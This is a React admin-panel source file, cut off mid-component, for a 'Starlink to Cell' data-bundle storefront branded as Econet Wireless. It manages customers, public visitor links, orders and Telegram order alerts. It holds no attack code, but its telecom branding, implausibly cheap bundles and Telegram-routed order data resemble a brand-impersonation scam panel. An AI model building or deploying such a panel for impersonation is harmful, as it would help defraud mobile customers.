import React, { useEffect, useRef, useState } from "react";
import { createRoot } from "react-dom/client";
import {
  BrowserRouter,
  Link,
  Route,
  Routes,
  useNavigate,
  useParams,
} from "react-router-dom";
import {
  Activity,
  Bell,
  Check,
  ChevronRight,
  CircleDollarSign,
  Copy,
  ExternalLink,
  Gauge,
  Globe,
  Link2,
  LoaderCircle,
  LogOut,
  Menu,
  MessageCircle,
  Package,
  Plus,
  RefreshCw,
  Search,
  Settings,
  ShieldCheck,
  ShoppingBag,
  Users,
  X,
} from "lucide-react";
import "./style.css";

const API = (import.meta.env.VITE_API_URL || "http://localhost:8080").replace(
  /\/$/,
  "",
);
const DEFAULT_BUNDLES = [
  {
    id: "5gb-trial",
    name: "5GB Data",
    validity: "2-Day Trial",
    price: 0,
    currency: "USD",
    description: "A free 2-day trial",
    enabled: true,
  },
  {
    id: "15gb-7d",
    name: "15GB Data",
    validity: "7-Day Plan",
    price: 0.99,
    currency: "USD",
    description: "15GB for 7 days",
    enabled: true,
  },
  {
    id: "35gb-14d",
    name: "35GB Data",
    validity: "14-Day Plan",
    price: 1.99,
    currency: "USD",
    description: "35GB for 14 days",
    enabled: true,
  },
  {
    id: "50gb-21d",
    name: "50GB Data",
    validity: "21-Day Plan",
    price: 2.99,
    currency: "USD",
    description: "50GB for 21 days",
    enabled: true,
  },
  {
    id: "unlimited-30d",
    name: "Unlimited",
    validity: "30-Day Plan",
    price: 3.99,
    currency: "USD",
    description: "Unlimited data for 30 days",
    enabled: true,
  },
];
const usd = (n) => (Number(n) === 0 ? "FREE" : `USD ${Number(n).toFixed(2)}`);
const token = () => localStorage.getItem("adminToken");
async function api(path, options = {}) {
  const response = await fetch(`${API}${path}`, {
    ...options,
    headers: {
      "content-type": "application/json",
      ...(token() ? { authorization: `Bearer ${token()}` } : {}),
      ...(options.headers || {}),
    },
  });
  const data = await response.json().catch(() => ({}));
  if (!response.ok)
    throw new Error(data.error || `Request failed (${response.status})`);
  return data;
}
function App() {
  const [loggedIn, setLoggedIn] = useState(Boolean(token()));
  const path = window.location.pathname;
  if (path.startsWith("/l/")) return <VisitorPage />;
  return loggedIn ? (
    <AdminApp
      onLogout={() => {
        localStorage.removeItem("adminToken");
        setLoggedIn(false);
      }}
    />
  ) : (
    <Login onLogin={() => setLoggedIn(true)} />
  );
}
function Login({ onLogin }) {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [busy, setBusy] = useState(false);
  async function submit(e) {
    e.preventDefault();
    setBusy(true);
    setError("");
    try {
      const r = await api("/api/auth/login", {
        method: "POST",
        body: JSON.stringify({ email, password }),
      });
      localStorage.setItem("adminToken", r.token);
      onLogin();
    } catch (err) {
      setError(err.message);
    } finally {
      setBusy(false);
    }
  }
  return (
    <div className="login-shell">
      <div className="login-card">
        <div className="brand-mark">
          <Globe size={25} />
        </div>
        <p className="eyebrow">ECONET WIRELESS</p>
        <h1>Admin Panel</h1>
        <p className="muted">
          Manage customer links, orders and Telegram notifications.
        </p>
        <form onSubmit={submit} className="form-stack">
          <label>
            Admin email
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
              autoComplete="username"
            />
          </label>
          <label>
            Password
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
              autoComplete="current-password"
            />
          </label>
          {error && <p className="error">{error}</p>}
          <button className="primary full" disabled={busy}>
            {busy ? "Signing in…" : "Sign in securely"}
          </button>
        </form>
        <p className="small muted">Admin access is verified by the backend.</p>
      </div>
    </div>
  );
}
const nav = [
  ["Dashboard", Gauge],
  ["Customers", Users],
  ["Visitor Links", Link2],
  ["Bundles", Package],
  ["Orders", ShoppingBag],
  ["Notifications", Bell],
  ["Settings", Settings],
];
function AdminApp({ onLogout }) {
  const [section, setSection] = useState("Dashboard");
  const [mobileNav, setMobileNav] = useState(false);
  return (
    <div className="admin-shell">
      <aside className={`sidebar ${mobileNav ? "open" : ""}`}>
        <div className="side-brand">
          <div className="brand-mark small-mark">
            <Globe size={19} />
          </div>
          <div>
            <strong>Starlink to Cell</strong>
            <span>ADMIN CONSOLE</span>
          </div>
        </div>
        <div className="side-caption">WORKSPACE</div>
        <nav>
          {nav.map(([label, Icon]) => (
            <button
              key={label}
              className={`nav-item ${section === label ? "active" : ""}`}
              onClick={() => {
                setSection(label);
                setMobileNav(false);
              }}
            >
              <Icon size={18} />
              <span>{label}</span>
              {section === label && (
                <ChevronRight size={15} className="nav-chevron" />
              )}
            </button>
          ))}
        </nav>
        <div className="sidebar-bottom">
          <div className="secure">
            <ShieldCheck size={17} />
            <div>
              <b>Secure workspace</b>
              <span>Server-authenticated</span>
            </div>
          </div>
          <button className="nav-item logout" onClick={onLogout}>
            <LogOut size={18} /> Sign out
          </button>
        </div>
      </aside>
      <main className="main">
        <header className="topbar">
          <button
            className="icon-btn mobile-menu"
            onClick={() => setMobileNav(!mobileNav)}
          >
            <Menu />
          </button>
          <div className="breadcrumbs">
            Workspace <span>/</span> <b>{section}</b>
          </div>
          <div className="top-right">
            <span className="status-dot" /> <span>Admin session</span>
            <button className="avatar" title="Admin">
              A
            </button>
          </div>
        </header>
        <div className="content">
          <Section section={section} onNavigate={setSection} />
        </div>
      </main>
    </div>
  );
}
function Section({ section, onNavigate }) {
  const [refresh, setRefresh] = useState(0);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [toast, setToast] = useState("");
  const [dashboard, setDashboard] = useState(null);
  const [customers, setCustomers] = useState([]);
  const [links, setLinks] = useState([]);
  const [orders, setOrders] = useState([]);
  const [notifications, setNotifications] = useState([]);
  const [bundleCatalog, setBundleCatalog] = useState(DEFAULT_BUNDLES);
  const [telegramStatus, setTelegramStatus] = useState(null);
  const [telegramChecking, setTelegramChecking] = useState(false);
  const [showCustomer, setShowCustomer] = useState(false);
  const [showLink, setShowLink] = useState(false);
  const [query, setQuery] = useState("");
  const [orderFilters, setOrderFilters] = useState({ customerId: "", linkId: "", orderRef: "", bundleId: "", paymentStatus: "", notificationStatus: "", from: "", to: "" });
  async function load() {
    setLoading(true);
    setError("");
    try {
      if (section === "Dashboard") {
        setDashboard(await api("/api/admin/dashboard"));
      }
      if (
        section === "Customers" ||
        section === "Visitor Links" ||
        section === "Orders" ||
        section === "Notifications" ||
        section === "Settings"
      ) {
        const r = await api("/api/admin/customers");
        setCustomers(r.customers || []);
      }
      if (section === "Visitor Links") {
        const r = await api("/api/admin/links");
        setLinks(r.links || []);
        const b = await api("/api/admin/bundles");
        setBundleCatalog(b.bundles || DEFAULT_BUNDLES);
      }
      if (section === "Bundles") {
        const b = await api("/api/admin/bundles");
        setBundleCatalog(b.bundles || DEFAULT_BUNDLES);
      }
      if (section === "Orders") {
        const r = await api("/api/admin/orders");
        setOrders(r.orders || []);
        const [linkResult, bundleResult] = await Promise.all([
          api("/api/admin/links"),
          api("/api/admin/bundles"),
        ]);
        setLinks(linkResult.links || []);
        setBundleCatalog(bundleResult.bundles || DEFAULT_BUNDLES);
      }
      if (section === "Notifications") {
        const r = await api("/api/admin/notifications");
        setNotifications(r.notifications || []);
      }
      if (section === "Settings") {
        try {
          setTelegramStatus(await api("/api/admin/telegram/status"));
        } catch (statusError) {
          setTelegramStatus({ configured: true, connected: false, error: statusError.message });
        }
      }
    } catch (e) {
      setError(e.message);
    } finally {
      setLoading(false);
    }
  }
  useEffect(() => {
    load();
  }, [section, refresh]);
  function notify(msg) {
    setToast(msg);
    window.setTimeout(() => setToast(""), 3500);
  }
  async function testTelegramBot() {
    setTelegramChecking(true);
    try {
      setTelegramStatus(await api("/api/admin/telegram/status"));
    } catch (statusError) {
      setTelegramStatus({ configured: true, connected: false, error: statusError.message });
    } finally {
      setTelegramChecking(false);
    }
  }
  const filteredCustomers = customers.filter((c) =>
    `${c.name} ${c.notes || ""}`.toLowerCase().includes(query.toLowerCase()),
  );
  const filteredOrders = orders.filter((order) => {
    const notificationStatus = order.notifications?.[0]?.status || "not queued";
    const submittedDate = order.created_at.slice(0, 10);
    return (!orderFilters.customerId || order.customer_id === orderFilters.customerId)
      && (!orderFilters.linkId || order.link_id === orderFilters.linkId)
      && (!orderFilters.orderRef || order.order_ref.toLowerCase().includes(orderFilters.orderRef.toLowerCase()))
      && (!orderFilters.bundleId || order.bundle_id === orderFilters.bundleId)
      && (!orderFilters.paymentStatus || order.payment_status === orderFilters.paymentStatus)
      && (!orderFilters.notificationStatus || notificationStatus === orderFilters.notificationStatus)
      && (!orderFilters.from || submittedDate >= orderFilters.from)
      && (!orderFilters.to || submittedDate <= orderFilters.to);
  });
  return (
    <>
      <div className="page-heading">
        <div>
          <p className="eyebrow">OVERVIEW / MANAGEMENT</p>
          <h1>{section}</h1>
          <p className="muted">
            {
              {
                Dashboard: "A live overview of your data bundle business.",
                Customers:
                  "Manage customer profiles and their Telegram destinations.",
                "Visitor Links":
                  "Generate and manage isolated customer visitor links.",
                Bundles: "Review the standard USD bundle plans.",
                Orders: "Track submitted orders and payment state.",
                Notifications:
                  "Review Telegram delivery attempts and retry failures.",
                Settings: "Configure your workspace and deployment.",
              }[section]
            }
          </p>
        </div>
        <div className="heading-actions">
          <button
            className="secondary"
            onClick={() => setRefresh((v) => v + 1)}
          >
            <RefreshCw size={16} /> Refresh
          </button>
          {section === "Customers" && (
            <button className="primary" onClick={() => setShowCustomer(true)}>
              <Plus size={17} /> New customer
            </button>
          )}
          {section === "Visitor Links" && (
            <button className="primary" onClick={() => setShowLink(true)}>
              <Plus size={17} /> Generate link
            </button>
          )}
        </div>
      </div>
      {error && <div className="alert error">{error}</div>}
      {toast && <div className="alert success">{toast}</div>}
      {loading && (
        <div className="loading-line">
          <LoaderCircle className="spin" size={16} /> Loading live data…
        </div>
      )}
      {section === "Dashboard" && (
        <Dashboard data={dashboard} onNavigate={onNavigate} />
      )}
      {section === "Customers" && (
        <>
          <div className="toolbar">
            <div className="searchbox">
              <Search size={16} />
              <input
                placeholder="Search customers…"
                value={query}
                onChange={(e) => setQuery(e.target.value)}
              />
            </div>
            <span className="muted small">
              {filteredCustomers.length} customers
            </span>
          </div>
          <div className="panel table-panel">
            <table>
              <thead>
                <tr>
                  <th>Customer</th>
                  <th>Telegram destination</th>
                  <th>Notifications</th>
                  <th>Created</th>
                  <th>Actions</th>
                </tr>
              </thead>
              <tbody>
                {filteredCustomers.map((c) => (
                  <CustomerRow
                    key={c.id}
                    customer={c}
                    onSaved={() => {
                      setRefresh((v) => v + 1);
                      notify("Customer settings saved.");
                    }}
                    onError={setError}
                  />
                ))}
                {!filteredCustomers.length && (
                  <EmptyRow
                    colSpan={5}
                    text="No customers yet. Create your first customer to get started."
                  />
                )}
              </tbody>
            </table>
          </div>
        </>
      )}
      {section === "Visitor Links" && (
        <>
          <div className="toolbar">
            <div className="searchbox">
              <Search size={16} />
              <input
                placeholder="Search links…"
                value={query}
                onChange={(e) => setQuery(e.target.value)}
              />
            </div>
            <span className="muted small">Links are created as drafts</span>
          </div>
          <div className="panel table-panel">
            <table>
              <thead>
                <tr>
                  <th>Link</th>
                  <th>Customer</th>
                  <th>Bundles</th>
                  <th>Status</th>
                  <th>Public URL</th>
                  <th>Actions</th>
                </tr>
              </thead>
              <tbody>
                {links
                  .filter((l) =>
                    `${l.name} ${l.customers?.name || ""}`
                      .toLowerCase()
                      .includes(query.toLowerCase()),
                  )
                  .map((l) => (
                    <LinkRow
                      key={l.id}
                      link={l}
                      onChanged={() => setRefresh((v) => v + 1)}
                      onError={setError}
                      onToast={notify}
                    />
                  ))}
                {!links.length && (
                  <EmptyRow
                    colSpan={6}
                    text="No links generated. Create a customer first, then generate a link."
                  />
                )}
              </tbody>
            </table>
          </div>
        </>
      )}
      {section === "Bundles" && (
        <BundleManager
          bundles={bundleCatalog}
          onSaved={() => setRefresh((v) => v + 1)}
          onError={setError}
          onToast={notify}
        />
      )}
      {section === "Orders" && (
        <>
        <div className="toolbar order-filters">
          <input aria-label="Filter by order reference" placeholder="Order reference" value={orderFilters.orderRef} onChange={(e) => setOrderFilters((old) => ({ ...old, orderRef: e.target.value }))} />
          <select aria-label="Filter by customer" value={orderFilters.customerId} onChange={(e) => setOrderFilters((old) => ({ ...old, customerId: e.target.value }))}><option value="">All customers</option>{customers.map((customer) => <option key={customer.id} value={customer.id}>{customer.name}</option>)}</select>
          <select aria-label="Filter by link" value={orderFilters.linkId} onChange={(e) => setOrderFilters((old) => ({ ...old, linkId: e.target.value }))}><option value="">All links</option>{links.map((link) => <option key={link.id} value={link.id}>{link.name}</option>)}</select>
          <select aria-label="Filter by bundle" value={orderFilters.bundleId} onChange={(e) => setOrderFilters((old) => ({ ...old, bundleId: e.target.value }))}><option value="">All bundles</option>{bundleCatalog.map((bundle) => <option key={bundle.id} value={bundle.id}>{bundle.name}</option>)}</select>
          <select aria-label="Filter by payment status" value={orderFilters.paymentStatus} onChange={(e) => setOrderFilters((old) => ({ ...old, paymentStatus: e.target.value }))}><option value="">All payment states</option>{["pending", "paid", "failed", "cancelled", "refunded"].map((status) => <option key={status}>{status}</option>)}</select>
          <select aria-label="Filter by notification status" value={orderFilters.notificationStatus} onChange={(e) => setOrderFilters((old) => ({ ...old, notificationStatus: e.target.value }))}><option value="">All notification states</option>{["not queued", "queued", "processing", "sent", "failed"].map((status) => <option key={status}>{status}</option>)}</select>
          <label>From<input type="date" value={orderFilters.from} onChange={(e) => setOrderFilters((old) => ({ ...old, from: e.target.value }))} /></label>
          <label>To<input type="date" value={orderFilters.to} onChange={(e) => setOrderFilters((old) => ({ ...old, to: e.target.value }))} /></label>
        </div>
        <div className="panel table-panel">
          <table>
            <thead>
              <tr>
                <th>Order reference</th>
                <th>Customer / link</th>
                <th>Bundle</th>
                <th>Amount</th>
                <th>Payment</th>
                <th>Submitted</th>
              </tr>
            </thead>
            <tbody>
              {filteredOrders.map((o) => (
                <tr key={o.id}>
                  <td>
                    <b className="mono">{o.order_ref}</b>
                  </td>
                  <td>
                    {o.customers?.name || "—"}
                    <small>{o.visitor_links?.name || "—"}</small>
                  </td>
                  <td>{o.bundle_name}</td>
                  <td>
                    <b>{usd(o.amount)}</b>
                  </td>
                  <td>
                    <span
                      className={`pill ${o.payment_status === "paid" ? "enabled" : "pending"}`}
                    >
                      {o.payment_status}
                    </span>
                    <small>Telegram: {o.notifications?.[0]?.status || "not queued"}</small>
                  </td>
                  <td>{new Date(o.created_at).toLocaleString()}</td>
                </tr>
              ))}
              {!filteredOrders.length && (
                <EmptyRow
                  colSpan={6}
                  text={orders.length ? "No orders match these filters." : "Orders will appear here when visitors submit a bundle request."}
                />
              )}
            </tbody>
          </table>
        </div>
        </>
      )}
      {section === "Notifications" && (
        <div className="panel table-panel">
          <table>
            <thead>
              <tr>
                <th>Event</th>
                <th>Customer / link</th>
                <th>Destination</th>
                <th>Status</th>
                <th>Attempts</th>
                <th>Attempt history</th>
                <th>Last error</th>
                <th>Action</th>
              </tr>
            </thead>
            <tbody>
              {notifications.map((n) => (
                <tr key={n.id}>
                  <td>
                    {n.event_type}
                    <small>{n.orders?.order_ref || "—"}</small>
                  </td>
                  <td>
                    {n.customers?.name || "—"}
                    <small>{n.visitor_links?.name || "—"}</small>
                  </td>
                  <td className="mono">{n.intended_chat_id}</td>
                  <td>
                    <span
                      className={`pill ${n.status === "sent" ? "enabled" : n.status === "failed" ? "failed" : "pending"}`}
                    >
                      {n.status}
                    </span>
                  </td>
                  <td>{n.attempts}</td>
                  <td>
                    {n.delivery_attempts?.length ? (
                      <details>
                        <summary>{n.delivery_attempts.length} records</summary>
                        {n.delivery_attempts.map((attempt) => (
                          <p key={attempt.id}>
                            #{attempt.attempt_number} {attempt.status} · {new Date(attempt.attempted_at).toLocaleString()}
                            {attempt.error ? ` · ${attempt.error}` : ""}
                          </p>
                        ))}
                      </details>
                    ) : "—"}
                  </td>
                  <td className="error-text">{n.last_error || "—"}</td>
                  <td>
                    {n.status === "failed" && (
                      <button
                        className="secondary compact"
                        onClick={async () => {
                          try {
                            await api(
                              `/api/admin/notifications/${n.id}/retry`,
                              { method: "POST", body: "{}" },
                            );
                            notify("Retry queued");
                            setRefresh((v) => v + 1);
                          } catch (e) {
                            setError(e.message);
                          }
                        }}
                      >
                        Retry
                      </button>
                    )}
                  </td>
                </tr>
              ))}
              {!notifications.length && (
                <EmptyRow
                  colSpan={8}
                  text="No notification events recorded yet."
                />
              )}
            </tbody>
          </table>
        </div>
      )}
      {section === "Settings" && (
        <div className="settings-grid">
          <div className="panel settings-card">
            <div className="section-icon">
              <ShieldCheck />
            </div>
            <h3>Security & access</h3>
            <p>
              Admin authentication is enforced by the backend. Sessions expire
              after eight hours.
            </p>
            <span className="pill enabled">Server-side auth</span>
          </div>
          <div className="panel settings-card">
            <div className="section-icon">
              <MessageCircle />
            </div>
            <h3>Telegram Bot API</h3>
            <p>
              The bot token belongs in the Render backend environment. Never add
              it to Vercel public variables.
            </p>
            <span className={`pill ${telegramStatus?.connected ? "enabled" : "pending"}`}>
              {!telegramStatus ? "Not checked" : !telegramStatus.configured ? "Token not configured" : telegramStatus.connected ? `Connected as @${telegramStatus.bot?.username || "bot"}` : telegramStatus.error || "Connection failed"}
            </span>
            <p className="small muted">Bot API verification does not verify any saved customer Chat ID.</p>
            <button className="secondary compact" onClick={testTelegramBot} disabled={telegramChecking}>
              {telegramChecking ? "Checking…" : "Test Telegram Bot"}
            </button>
          </div>
          <div className="panel settings-card">
            <div className="section-icon">
              <CircleDollarSign />
            </div>
            <h3>Payments</h3>
            <p>
              New orders remain pending until a real payment provider verifies
              payment. No wallet PIN is collected or stored.
            </p>
            <span className="pill pending">Payment adapter not configured</span>
          </div>
          <div className="panel settings-card">
            <div className="section-icon">
              <Globe />
            </div>
            <h3>Public link domain</h3>
            <p>
              Set PUBLIC_APP_URL on Render to your verified Vercel domain or
              custom domain before publishing links.
            </p>
            <span className="pill pending">Environment setting</span>
          </div>
        </div>
      )}
      {showCustomer && (
        <CustomerModal
          onClose={() => setShowCustomer(false)}
          onCreated={() => {
            setShowCustomer(false);
            setRefresh((v) => v + 1);
            notify("Customer created.");
          }}
          onError={setError}
        />
      )}
      {showLink && (
        <LinkModal
          customers={customers}
          catalog={bundleCatalog}
          onClose={() => setShowLink(false)}
          onCreated={() => {
            setShowLink(false);
            setRefresh((v) => v + 1);
            notify("Draft link generated.");
          }}
          onError={setError}
        />
      )}
    </>
  );
}
function Dashboard({ data, onNavigate }) {
  if (!data)
    return (
      <div className="dashboard-skeleton">
        Connect the API and Supabase to load real dashboard metrics.
      </div>
    );
  const metrics = [
    ["Total customers", data.customers, Users, "blue"],
    ["Generated links", data.links, Link2, "purple"],
    ["Total orders", data.orders, ShoppingBag, "orange"],
    ["Failed notifications", data.failedNotifications, Bell, "red"],
  ];
  return (
    <>
      <div className="metric-grid">
        {metrics.map(([label, value, Icon, color]) => (
          <div className="metric-card" key={label}>
            <div className={`metric-icon ${color}`}>
              <Icon size={20} />
            </div>
            <div className="metric-label">{label}</div>
            <div className="metric-value">{value}</div>
            <div className="metric-foot">
              <span className="live-dot" /> Live database count
            </div>
          </div>
        ))}
      </div>
      <div className="dashboard-columns">
        <div className="panel">
          <div className="panel-heading">
            <div>
              <h3>Visitor link status</h3>
              <p>Current status of all generated links</p>
            </div>
            <Link2 size={18} />
          </div>
          <div className="status-list">
            {[
              ["Published", data.linkStatuses?.published || 0, "green"],
              ["Draft", data.linkStatuses?.draft || 0, "blue"],
              ["Unpublished", data.linkStatuses?.unpublished || 0, "gray"],
              ["Disabled", data.linkStatuses?.disabled || 0, "red"],
            ].map(([label, value, color]) => (
              <div className="status-row" key={label}>
                <span>
                  <i className={`status-mini ${color}`} />
                  {label}
                </span>
                <b>{value}</b>
              </div>
            ))}
          </div>
          <button
            className="text-action"
            onClick={() => onNavigate("Visitor Links")}
          >
            Manage visitor links <ChevronRight size={16} />
          </button>
        </div>
        <div className="panel quick-panel">
          <div className="panel-heading">
            <div>
              <h3>Quick actions</h3>
              <p>Common administration tasks</p>
            </div>
            <Activity size={18} />
          </div>
          <button
            className="quick-action"
            onClick={() => onNavigate("Customers")}
          >
            <span className="quick-icon">
              <Users size={18} />
            </span>
            <span>
              <b>Add a customer</b>
              <small>
                Create a customer with their own Telegram destination
              </small>
            </span>
            <ChevronRight size={17} />
          </button>
          <button
            className="quick-action"
            onClick={() => onNavigate("Visitor Links")}
          >
            <span className="quick-icon">
              <Link2 size={18} />
            </span>
            <span>
              <b>Generate visitor link</b>
              <small>Choose bundles and link-specific settings</small>
            </span>
            <ChevronRight size={17} />
          </button>
          <button
            className="quick-action"
            onClick={() => onNavigate("Notifications")}
          >
            <span className="quick-icon">
              <Bell size={18} />
            </span>
            <span>
              <b>Check notifications</b>
              <small>Review delivery status and retry failures</small>
            </span>
            <ChevronRight size={17} />
          </button>
        </div>
      </div>
    </>
  );
}
function EmptyRow({ colSpan, text }) {
  return (
    <tr>
      <td colSpan={colSpan}>
        <div className="empty-state">
          <div className="empty-icon">
            <Package size={21} />
          </div>
          <b>{text}</b>
        </div>
      </td>
    </tr>
  );
}
function BundleManager({ bundles, onSaved, onError, onToast }) {
  const [drafts, setDrafts] = useState(bundles);
  const [busy, setBusy] = useState("");
  useEffect(() => setDrafts(bundles), [bundles]);
  function update(id, key, value) {
    setDrafts((old) =>
      old.map((b) => (b.id === id ? { ...b, [key]: value } : b)),
    );
  }
  async function save(b) {
    setBusy(b.id);
    try {
      await api(`/api/admin/bundles/${b.id}`, {
        method: "PUT",
        body: JSON.stringify({ ...b, price: Number(b.price), currency: "USD" }),
      });
      onToast(`${b.name} saved.`);
      onSaved();
    } catch (e) {
      onError(e.message);
    } finally {
      setBusy("");
    }
  }
  return (
    <div className="bundle-admin-list">
      {drafts.map((b, i) => (
        <div className="panel bundle-admin-row" key={b.id}>
          <div className="bundle-admin-title">
            <div className="bundle-icon">
              <Package size={20} />
            </div>
            <div>
              <h3>{b.name}</h3>
              <small>{b.id}</small>
            </div>
            <label className="check-label">
              <input
                type="checkbox"
                checked={b.enabled !== false}
                onChange={(e) => update(b.id, "enabled", e.target.checked)}
              />{" "}
              Available
            </label>
          </div>
          <div className="bundle-admin-fields">
            <label>
              Display name
              <input
                value={b.name}
                onChange={(e) => update(b.id, "name", e.target.value)}
              />
            </label>
            <label>
              Validity
              <input
                value={b.validity}
                onChange={(e) => update(b.id, "validity", e.target.value)}
              />
            </label>
            <label>
              Price (USD)
              <input
                type="number"
                min="0"
                max="10000"
                step="0.01"
                value={b.price}
                onChange={(e) => update(b.id, "price", e.target.value)}
              />
            </label>
            <label>
              Promo label
              <input
                value={b.promotionalLabel || ""}
                onChange={(e) =>
                  update(b.id, "promotionalLabel", e.target.value)
                }
                placeholder="Optional"
              />
            </label>
            <label className="bundle-description">
              Description
              <input
                value={b.description || ""}
                onChange={(e) => update(b.id, "description", e.target.value)}
              />
            </label>
          </div>
          <div className="bundle-admin-foot">
            <span className="muted small">
              Current price: <b>{usd(b.price)}</b>
            </span>
            <button
              className="primary compact"
              disabled={busy === b.id}
              onClick={() => save(b)}
            >
              {busy === b.id ? "Saving…" : "Save bundle"}
            </button>
          </div>
        </div>
      ))}
    </div>
  );
}

function CustomerRow({ customer: c, onSaved, onError }) {
  const [editing, setEditing] = useState(false);
  const [chat, setChat] = useState(c.telegram_chat_id || "");
  const [enabled, setEnabled] = useState(Boolean(c.notifications_enabled));
  const [includePhone, setIncludePhone] = useState(Boolean(c.notification_preferences?.phone));
  const [includeAmount, setIncludeAmount] = useState(c.notification_preferences?.amount !== false);
  const [busy, setBusy] = useState(false);
  const [test, setTest] = useState("");
  async function save() {
    setBusy(true);
    try {
      await api(`/api/admin/customers/${c.id}`, {
        method: "PUT",
        body: JSON.stringify({
          telegramChatId: chat,
          notificationsEnabled: enabled,
          notificationPreferences: { newOrder: true, phone: includePhone, amount: includeAmount },
        }),
      });
      setEditing(false);
      onSaved();
    } catch (e) {
      onError(e.message);
    } finally {
      setBusy(false);
    }
  }
  async function testTelegram() {
    setTest("Testing…");
    try {
      const r = await api(`/api/admin/customers/${c.id}/telegram-test`, {
        method: "POST",
        body: JSON.stringify({ chatId: chat || undefined }),
      });
      setTest(r.connected ? "Sent successfully" : "Failed");
    } catch (e) {
      setTest(e.message);
    }
  }
  return (
    <tr>
      <td>
        <div className="customer-cell">
          <div className="customer-avatar">
            {c.name.slice(0, 1).toUpperCase()}
          </div>
          <div>
            <b>{c.name}</b>
            <small>{c.notes || "No internal notes"}</small>
          </div>
        </div>
      </td>
      <td>
        {editing ? (
          <input
            className="inline-input"
            placeholder="Telegram Chat ID"
            value={chat}
            onChange={(e) => setChat(e.target.value)}
          />
        ) : (
          <span className="mono">{c.telegram_chat_id || "Not configured"}</span>
        )}
        {test && <small>{test}</small>}
      </td>
      <td>
        {editing ? (
          <div className="form-stack">
            <label className="check-label">
              <input
                type="checkbox"
                checked={enabled}
                onChange={(e) => setEnabled(e.target.checked)}
              />{" "}
              Enable notifications
            </label>
            <label className="check-label">
              <input
                type="checkbox"
                checked={includePhone}
                onChange={(e) => setIncludePhone(e.target.checked)}
              />{" "}
              Allow phone in alerts
            </label>
            <label className="check-label">
              <input
                type="checkbox"
                checked={includeAmount}
                onChange={(e) => setIncludeAmount(e.target.checked)}
              />{" "}
              Allow amount in alerts
            </label>
          </div>
        ) : (
          <span
            className={`pill ${c.notifications_enabled ? "enabled" : "pending"}`}
          >
            {c.notifications_enabled ? "Enabled" : "Disabled"}
          </span>
        )}
      </td>
      <td>{new Date(c.created_at).toLocaleDateString()}</td>
      <td>
        {editing ? (
          <div className="row-actions">
            <button className="primary compact" disabled={busy} onClick={save}>
              Save
            </button>
            <button
              className="secondary compact"
              onClick={() => setEditing(false)}
            >
              Cancel
            </button>
          </div>
        ) : (
          <div className="row-actions">
            <button
              className="secondary compact"
              onClick={() => setEditing(true)}
            >
              Edit
            </button>
            <button className="secondary compact" onClick={testTelegram}>
              Test Telegram
            </button>
          </div>
        )}
      </td>
    </tr>
  );
}
function LinkRow({ link: l, onChanged, onError, onToast }) {
  const [busy, setBusy] = useState(false);
  const [copied, setCopied] = useState(false);
  const [editing, setEditing] = useState(false);
  const [preview, setPreview] = useState(false);
  async function action(a) {
    setBusy(true);
    try {
      await api(`/api/admin/links/${l.id}/${a}`, {
        method: "POST",
        body: "{}",
      });
      onChanged();
      onToast(`Link ${a} action completed.`);
    } catch (e) {
      onError(e.message);
    } finally {
      setBusy(false);
    }
  }
  async function testTelegram() {
    setBusy(true);
    try {
      const r = await api(`/api/admin/links/${l.id}/telegram-test`, {
        method: "POST",
        body: "{}",
      });
      onToast(r.message);
    } catch (e) {
      onError(e.message);
    } finally {
      setBusy(false);
    }
  }
  async function copy() {
    if (!l.url) {
      onError("Set PUBLIC_APP_URL on the backend first.");
      return;
    }
    try {
      await navigator.clipboard.writeText(l.url);
      setCopied(true);
      setTimeout(() => setCopied(false), 1600);
    } catch {
      onError("Clipboard access was unavailable.");
    }
  }
  return (
    <tr>
      <td>
        <b>{l.name}</b>
        <small className="mono">{l.token.slice(0, 10)}…</small>
      </td>
      <td>{l.customers?.name || "—"}</td>
      <td>
        {(l.bundles || []).filter((b) => b.enabled !== false).length} enabled
      </td>
      <td>
        <span
          className={`pill ${l.status === "published" ? "enabled" : l.status === "disabled" ? "failed" : "pending"}`}
        >
          {l.status}
        </span>
      </td>
      <td>
        {l.url ? (
          <a className="url-link" href={l.url} target="_blank" rel="noreferrer">
            Open <ExternalLink size={13} />
          </a>
        ) : (
          "Set domain"
        )}
        <button className="icon-btn mini" title="Copy URL" onClick={copy}>
          <Copy size={14} />
        </button>
        {copied && <small>Copied</small>}
      </td>
      <td>
        <div className="row-actions">
          <button
            className="secondary compact"
            onClick={() => setPreview(true)}
          >
            Preview
          </button>
          <button
            className="secondary compact"
            disabled={busy}
            onClick={() => setEditing(true)}
          >
            Edit
          </button>
          <button
            className="secondary compact"
            disabled={busy}
            onClick={testTelegram}
          >
            Test Telegram
          </button>
          {l.status !== "published" ? (
            <button
              className="primary compact"
              disabled={busy}
              onClick={() => action("publish")}
            >
              Publish
            </button>
          ) : (
            <button
              className="secondary compact"
              disabled={busy}
              onClick={() => action("unpublish")}
            >
              Unpublish
            </button>
          )}
          {l.status !== "disabled" && (
            <button
              className="danger compact"
              disabled={busy}
              onClick={() => action("disable")}
            >
              Disable
            </button>
          )}
        </div>
        {preview && (
          <LinkPreviewModal link={l} onClose={() => setPreview(false)} />
        )}
        {editing && (
          <LinkEditModal
            link={l}
            onClose={() => setEditing(false)}
            onError={onError}
            onSaved={() => {
              setEditing(false);
              onChanged();
              onToast("Link configuration saved.");
            }}
          />
        )}
      </td>
    </tr>
  );
}
function LinkPreviewModal({ link, onClose }) {
  return (
    <Modal title={`Preview: ${link.name}`} onClose={onClose} wide>
      <div className="visitor-shell">
        <header className="visitor-header">
          <div className="satellite-banner"><Globe size={21} /><span>STARLINK TO CELL</span></div>
          <div className="econet-brand"><b>ECONET <span>Wireless</span></b></div>
        </header>
        <main className="visitor-main">
          <div className="visitor-hero"><h1>Starlink to Cell</h1><p>{link.name}</p></div>
          <div className="visitor-bundles">
            {(link.bundles || []).filter((bundle) => bundle.enabled !== false).map((bundle) => (
              <div className="visitor-bundle" key={bundle.id}>
                <span className="bundle-badge">{bundle.validity}</span>
                <h3>{bundle.name}</h3>
                <p>{bundle.description}</p>
                <div className="visitor-price">{usd(bundle.price)}</div>
              </div>
            ))}
          </div>
          <div className="pending-box">
            <b>Payment instructions</b>
            <p>{link.payment_instructions || "No payment instructions configured."}</p>
          </div>
          <p className="small muted">Preview only. This does not publish the link or accept an order.</p>
        </main>
      </div>
